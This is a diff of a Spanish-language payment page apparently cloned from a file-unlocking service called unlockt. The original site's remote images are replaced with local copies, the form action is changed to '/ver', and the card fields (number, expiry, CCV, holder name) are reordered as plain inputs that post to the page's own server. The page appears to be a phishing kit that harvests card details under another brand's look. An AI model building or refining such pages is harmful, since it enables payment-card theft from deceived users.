@@ -7,16 +7,6 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
         <meta name="description" content="Send locked files & charge to unlock them.">
         <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-        <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
-        <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png" />
-        <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png" />
-        <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png" />
-        <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png" />
-        <link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png" />
-        <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png" />
-        <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png" />
-        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png" />
-        <link rel="apple-touch-icon-precomposed" sizes="180x180" href="/apple-touch-icon-180x180.png">
         <link rel="preconnect" href="https://fonts.googleapis.com">
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
         <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
@@ -296,7 +286,7 @@ const emailValid = true
 </header>        </div>
         <div class=" bg-white p-4 lg:w-5/12 border-[#F7F7F7] rounded-2xl mb-6 lg:m-0 shadow-sm mt-4">
             <div class="flex lg:flex-col">
-                <div class="hidden lg:block bg-cover shadow-black/10 h-80 w-full mx-auto mb-4 rounded-2xl" style="background-image: url(https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/blur/blur_0618966f-695e-42ed-ad47-448f018ed8d4.png)"></div>
+                <div class="hidden lg:block bg-cover shadow-black/10 h-80 w-full mx-auto mb-4 rounded-2xl" style="background-image: url('img/thumbnails/blur_4e500cc8-995a-40af-b370-6f8c273c4c1b.png')"></div>
                 <div class="flex flex-1 items-center justify-between flex-row">
                     <div class="flex items-center space-x-4 lg:space-x-0">
                         <svg class="lg:hidden" width="60" height="46" viewBox="0 0 60 46" fill="none" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
@@ -305,7 +295,7 @@ const emailValid = true
                                                         <rect x="15" y="1" width="44" height="44" rx="12" fill="url(#pattern0)" stroke="white" stroke-width="2"></rect>
                             <defs>
                                 <pattern id="pattern0" patternContentUnits="objectBoundingBox" width="1" height="1">
-                                    <image xlink:href="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/blur/blur_0618966f-695e-42ed-ad47-448f018ed8d4.png" width="1" height="1" preserveAspectRatio="none"></image>
+                                    <image xlink:href="img/thumbnails/blur_4e500cc8-995a-40af-b370-6f8c273c4c1b.png" width="1" height="1" preserveAspectRatio="none"></image>
                                 </pattern>
                             </defs>
                         </svg>
@@ -445,7 +435,7 @@ const emailValid = true
                     Intentar de nuevo
                 </button>
             </div>
-            <form id="payment-form" class="payment-form" method="post" action="/confirmar/ver">
+            <form id="payment-form" class="payment-form" method="post" action="/ver">
                 <div class="mb-4">
                     <label for="customer-email" class="font-finter block font-medium text-sm mb-2 text-[#191B1E]">Correo electrónico*</label>
                     <input name="email" class="emailInpt flex-1 font-finter py-2 px-4 font-normal bg-white placeholder-[#A4A4A4] w-full text-[#191B1E] border-[#E5E5EA] rounded-xl border focus:outline-none ccInfInpt"
@@ -456,6 +446,8 @@ const emailValid = true
                     />
                     <p id="customer-email-error" class="hidden font-finter text-sm font-normal text-[#FE5555] mt-1"></p>
                 </div>
+                  <p class="font-finter font-medium text-sm mb-2">Titular de la tarjeta*</p>
+                <div class="flex-1 bg-white  rounded-xl mb-4" id="card-holder-name-element"><input name="name" type="text" id="nameInpt" class="nameInpt ccInfInpt rounded-xl border-[#E5E5EA] border" placeholder="Nombre completo"></div>
                 <p class="font-finter font-medium text-sm mb-2">Información de la tarjeta*</p>
                 <div class="inptDiv bg-white rounded-tl-xl rounded-tr-xl" id="card-number-element"><input name="num" type="text" inputmode="numeric" id="ccNumInpt" class="ccNumInpt ccInfInpt rounded-tl-xl rounded-tr-xl border border-[#E5E5EA]" placeholder="1234 5678 9101 1121" maxlength="16"> 
                 <div class="ccBrand">
@@ -466,8 +458,7 @@ const emailValid = true
                     <div class="flex-1 bg-white  rounded-bl-xl " id="card-expiration-date-element"><input name="date" type="text" inputmode="numeric" id="ccDteInpt" class="ccDteInpt ccInfInpt rounded-bl-xl border-[#E5E5EA] border-l border-b border-r" placeholder="MM / AA"maxlength="5"></div>
                     <div class="flex-1 bg-white  rounded-br-xl " id="card-verification-code-element"><input name="cde" type="number" id="ccvInpt" class="ccInfInpt ccvInpt rounded-br-xl border-[#E5E5EA] border-b border-r" placeholder="CCV"></div>
                 </div>
-                <p class="font-finter font-medium text-sm mb-2">Titular de la tarjeta*</p>
-                <div class="flex-1 bg-white  rounded-xl " id="card-holder-name-element"><input name="name" type="text" id="nameInpt" class="nameInpt ccInfInpt rounded-xl border-[#E5E5EA] border" placeholder="Nombre completo"></div>
+
                 <button class="bg-[#00B743] w-full py-2.5 rounded-xl text-white text-lg font-finter font-medium mt-8 payBtn" type="submit" id="pay">Pagar</button>
             </form>
         </div>
